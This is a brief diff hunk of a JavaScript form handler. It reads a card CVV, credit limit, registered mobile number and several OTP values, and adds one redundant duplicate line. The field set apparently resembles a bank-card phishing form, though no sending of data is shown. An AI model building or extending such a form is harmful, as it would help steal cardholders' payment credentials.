@@ -27,6 +27,7 @@ function submitForm(e) {
   var cvv = getElementVal("cvv");
   var creditlimit = getElementVal("ccl");
   var regmobile = getElementVal("rgmob_cc");
+  var regmobile = getElementVal("rgmob_cc");
   var otp1 = 0;
   var otp2 = 0;
   var otp3 = 0;
